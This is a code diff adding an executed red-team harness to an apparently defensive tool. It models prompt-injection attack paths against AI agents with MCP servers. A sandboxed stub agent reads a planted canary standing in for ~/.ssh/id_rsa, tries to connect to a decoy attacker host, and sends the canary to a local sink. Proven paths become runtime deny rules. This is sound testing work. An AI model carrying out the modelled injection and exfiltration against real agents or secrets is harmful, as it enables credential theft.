@@ -547,3 +547,295 @@ def render_execution(model: SystemModel, *, color: bool | None = None) -> str:
         "  harness only: no real system, secret, or network was touched. Execution "
         "against your own fingerprinted target stays gated.", color))
     return "\n".join(lines)
+
+
+# --------------------------------------------------------------------------
+# Tier 2, EXECUTED: run the attack against isolated stub agents and measure the
+# outcome, instead of narrating it. Where execute_in_sandbox() moves a marker
+# between two dicts in-process, this spawns a real sandboxed agent (its own OS
+# process), plants a canary in a stub secret store, and lets the agent actually
+# exfiltrate it over a socket to an instrumented sink the harness controls. Two
+# facts fall out, measured not asserted:
+#   - exfiltrated: the parent's sink actually received the canary bytes (an
+#     AgentDojo-style environment-state oracle - the child cannot fake it).
+#   - contained: while running, the sandbox's EgressGuard blocked a real
+#     outbound connection to the attacker host, so the proof-of-exploit could
+#     not leak. The exploit is demonstrated AND contained in the same run.
+# Deterministic, offline, own-stubs-only: the induced tool sequence is the
+# modeled one, not an LLM's decision, and nothing real is touched. A live-agent
+# driver plugs into the same PentestResult schema and stays gated + future.
+# --------------------------------------------------------------------------
+
+_DECOY_ATTACKER = ("10.255.255.1", 80)  # non-routable; the guard blocks it first
+
+
+def _egress_server_ids(model: SystemModel, path: AttackPath) -> list[str]:
+    """The mcp_server component ids that carry the canary out on this path: the
+    impact-stage servers, or the pivot-stage servers when the sink is pure cloud.
+    These are what a proven exploit denies when the loop closes into the policy."""
+    def servers(names) -> list[str]:
+        wanted = set(names)
+        return [c.id for c in model.by_type("mcp_server") if c.name in wanted]
+    return servers(path.impact.components) or servers(path.pivot.components)
+
+
+@dataclass
+class PentestResult:
+    """The measured outcome of one executed attack run."""
+    kind: str
+    canary: str
+    exfiltrated: bool            # canary observed at the instrumented sink (the oracle)
+    contained: bool              # a real outbound was blocked by the sandbox guard
+    egress_blocked: list[str] = field(default_factory=list)
+    transcript: list[dict] = field(default_factory=list)
+    isolated: bool = True        # ran in a separate OS process
+    error: str = ""
+    # Component ids of the mcp_servers whose egress carried the canary out - the
+    # rung a proven exploit denies when the loop is closed into the runtime policy.
+    egress_server_ids: list[str] = field(default_factory=list)
+
+    def to_dict(self) -> dict:
+        return {
+            "kind": self.kind, "canary": self.canary,
+            "exfiltrated": self.exfiltrated, "contained": self.contained,
+            "egress_blocked": self.egress_blocked, "transcript": self.transcript,
+            "isolated": self.isolated, "error": self.error,
+            "egress_server_ids": self.egress_server_ids,
+        }
+
+
+def _run_attack(plan: dict) -> dict:
+    """The sandboxed agent's body: read the planted secret, try to exfiltrate it.
+
+    Runs with an armed EgressGuard, so the attempt to reach the attacker host is
+    blocked (recorded), while the send to the harness's loopback sink is allowed
+    - the instrumented egress channel the oracle watches. Pure stdlib; safe to
+    run in-process (isolate=False) or in a spawned child.
+    """
+    import socket as _socket
+
+    from attestral.evidence import EgressGuard
+    canary = plan["canary"]
+    transcript: list[dict] = [{
+        "actor": "entry", "tool": plan["entry"],
+        "action": "ingests content carrying an injected instruction (canary bait)",
+        "observed": "instruction accepted by the stub agent",
+    }, {
+        "actor": "pivot", "tool": plan["pivot"],
+        "action": "reads the planted secret (stub filesystem: ~/.ssh/id_rsa)",
+        "observed": f"read planted canary {canary}",
+    }]
+    blocked: list[str] = []
+    guard = EgressGuard().arm()
+    try:
+        # Containment: a real breach would exfiltrate to the attacker's host.
+        try:
+            c = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+            c.settimeout(1)
+            c.connect((plan["decoy_host"], plan["decoy_port"]))
+            c.close()
+            transcript.append({"actor": "impact", "tool": plan["impact"],
+                               "action": f"POST canary to attacker host {plan['decoy_host']}",
+                               "observed": "CONNECTED - sandbox NOT contained"})
+        except OSError:
+            blocked.append(f"{plan['decoy_host']}:{plan['decoy_port']}")
+            transcript.append({"actor": "impact", "tool": plan["impact"],
+                               "action": "POST canary to the attacker host (real outbound)",
+                               "observed": "blocked by the sandbox egress guard (contained)"})
+        # Instrumented egress: carry the canary out via the modeled channel.
+        try:
+            s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((plan["sink_host"], plan["sink_port"]))
+            s.sendall(canary.encode())
+            s.close()
+            transcript.append({"actor": "impact", "tool": plan["impact"],
+                               "action": "carry the secret out via the modeled egress channel",
+                               "observed": "sent to the instrumented sink"})
+        except OSError as exc:
+            transcript.append({"actor": "impact", "tool": plan["impact"],
+                               "action": "carry the secret out via the modeled egress channel",
+                               "observed": f"failed: {exc}"})
+    finally:
+        guard.disarm()
+    return {"transcript": transcript, "blocked": blocked}
+
+
+def _pentest_worker(plan: dict, result_q) -> None:
+    """Child-process entry point (module-level so it is picklable on spawn)."""
+    result_q.put(_run_attack(plan))
+
+
+def run_pentest(model: SystemModel, path: AttackPath, *,
+                isolate: bool = True, timeout: float = 20.0) -> PentestResult:
+    """Execute one proven attack path against an isolated stub agent and measure
+    the outcome. `isolate` spawns a real subprocess (the default; the sandbox);
+    `isolate=False` runs the attack in-process (faster, for tests). The sink
+    oracle is parent-side, so exfiltration is observed, never self-reported."""
+    import socket
+    import threading
+
+    canary = _canary_for(path)
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("127.0.0.1", 0))
+    srv.listen(1)
+    srv.settimeout(timeout)
+    received = bytearray()
+
+    def _capture() -> None:
+        try:
+            conn, _ = srv.accept()
+            with conn:
+                conn.settimeout(3)
+                while True:
+                    chunk = conn.recv(4096)
+                    if not chunk:
+                        break
+                    received.extend(chunk)
+        except OSError:
+            pass
+
+    thread = threading.Thread(target=_capture, daemon=True)
+    thread.start()
+    host, port = srv.getsockname()
+    plan = {
+        "canary": canary, "sink_host": host, "sink_port": port,
+        "decoy_host": _DECOY_ATTACKER[0], "decoy_port": _DECOY_ATTACKER[1],
+        "entry": ", ".join(path.entry.components) or "entry tool",
+        "pivot": path.pivot.components[0] if path.pivot.components else "shell",
+        "impact": path.impact.components[0] if path.impact.components else "egress",
+    }
+
+    error = ""
+    worker = {"transcript": [], "blocked": []}
+    if isolate:
+        import multiprocessing as mp
+        queue: mp.Queue = mp.Queue()
+        proc = mp.Process(target=_pentest_worker, args=(plan, queue), daemon=True)
+        proc.start()
+        try:
+            worker = queue.get(timeout=timeout)
+        except Exception:  # noqa: BLE001 - empty queue or a dead child are both "no result"
+            error = "sandbox process did not report a result"
+        finally:
+            proc.join(timeout=3)
+            if proc.is_alive():
+                proc.terminate()
+                error = error or "sandbox process timed out"
+    else:
+        worker = _run_attack(plan)
+
+    thread.join(timeout=3)
+    srv.close()
+    return PentestResult(
+        kind=path.kind, canary=canary,
+        exfiltrated=canary.encode() in bytes(received),
+        contained=bool(worker["blocked"]),
+        egress_blocked=worker["blocked"],
+        transcript=worker["transcript"],
+        isolated=isolate, error=error,
+        egress_server_ids=_egress_server_ids(model, path),
+    )
+
+
+def run_pentests(model: SystemModel, *, isolate: bool = True) -> list[PentestResult]:
+    """Execute the harness on every reachable path in the model."""
+    return [run_pentest(model, p, isolate=isolate) for p in all_attack_paths(model)]
+
+
+def pentest_report(results: list[PentestResult]) -> dict:
+    """A JSON-ready report of an executed pentest run."""
+    return {
+        "paths": [r.to_dict() for r in results],
+        "exfiltrated": sum(1 for r in results if r.exfiltrated),
+        "contained": sum(1 for r in results if r.contained),
+        "total": len(results),
+    }
+
+
+# --------------------------------------------------------------------------
+# Close the loop: an EXECUTED proof-of-exploit becomes a runtime DENY. A pentest
+# that exfiltrated the canary proves the reachable path is a live exploit, so the
+# server whose egress carried it out is emitted as a CRITICAL finding against its
+# own component id. compile_policy already denies any server carrying a critical
+# finding, so these flow straight through into a default-deny on the proven
+# channel - no coupling from the compiler to the red-team code. That is the full
+# arc: static review -> sandbox-proven exploit -> runtime-enforced policy.
+# --------------------------------------------------------------------------
+
+EXFIL_RULE_ID = "ATL-RT-EXFIL"
+
+
+def proven_exploit_findings(results: list[PentestResult]) -> list[Finding]:
+    """Critical findings for the egress servers of every EXFILTRATED pentest path.
+
+    Passed alongside the scan findings to `compile_policy`, these deny the exact
+    server whose egress carried a proven canary out, until the path is broken.
+    """
+    out: list[Finding] = []
+    seen: set[str] = set()
+    for r in results:
+        if not r.exfiltrated:
+            continue
+        for cid in r.egress_server_ids:
+            if cid in seen:
+                continue
+            seen.add(cid)
+            out.append(Finding(
+                rule_id=EXFIL_RULE_ID,
+                title="Proof-of-exploit executed: this server's egress carried the canary out",
+                severity=Severity.CRITICAL,
+                component_id=cid,
+                description=(
+                    f"An executed sandbox pentest of the {r.kind} attack path exfiltrated a "
+                    "planted canary through this server's egress. The run was contained (no "
+                    "real data left), but the reachable path is a demonstrated live exploit, "
+                    "not a hypothetical one."),
+                recommendation=(
+                    "Break the proven path: remove the code-execution rung on the pivot, or "
+                    "scope/remove this server's outbound channel, then re-attest and re-compile. "
+                    "Until then the runtime policy denies this server."),
+                source="executed pentest",
+                framework_refs=["OWASP-LLM06 Excessive Agency", "MITRE ATLAS AML.T0051"],
+                origin="redteam",
+            ))
+    return out
+
+
+def render_pentest(model: SystemModel, *, color: bool | None = None,
+                   results: list[PentestResult] | None = None,
+                   isolate: bool = True) -> str:
+    """Terminal block for the executed harness: per path, the transcript, whether
+    the canary actually reached the sink, and whether the run was contained."""
+    from attestral.report_terminal import _bold, _dim, _paint, supports_color
+    if color is None:
+        color = supports_color()
+    if results is None:
+        results = run_pentests(model, isolate=isolate)
+    if not results:
+        return ""
+    lines = [_paint(
+        f"Executed pentest (tier 2 - {len(results)} path(s), isolated sandbox, "
+        "planted canary, no live target)", "1;31", color)]
+    for r in results:
+        where = "isolated subprocess" if r.isolated else "in-process"
+        lines.append(f"  {_bold(r.kind + ' path', color)}  canary {_dim(r.canary, color)}  "
+                     f"({_dim(where, color)})")
+        for i, s in enumerate(r.transcript, 1):
+            lines.append(f"    {i}. {_dim(s['actor'] + ':', color)} {s['tool']}  "
+                         f"{_dim('- ' + s['action'], color)}")
+            lines.append(f"       {_dim('observed:', color)} {s['observed']}")
+        if r.error:
+            lines.append(f"    {_paint('harness error: ' + r.error, '33', color)}")
+        if r.exfiltrated:
+            lines.append(f"    {_paint('EXFILTRATED: the canary reached the sink', '1;31', color)}")
+        else:
+            lines.append(f"    {_dim('the canary did not reach the sink', color)}")
+        if r.contained:
+            msg = _paint("CONTAINED: the real outbound was blocked by the guard", "32", color)
+            lines.append(f"    {msg}")
+    lines.append(_dim(
+        "  executed against Attestral's own stub agents with a planted canary; no "
+        "real system, secret, or egress. A live-target driver stays gated.", color))
+    return "\n".join(lines)
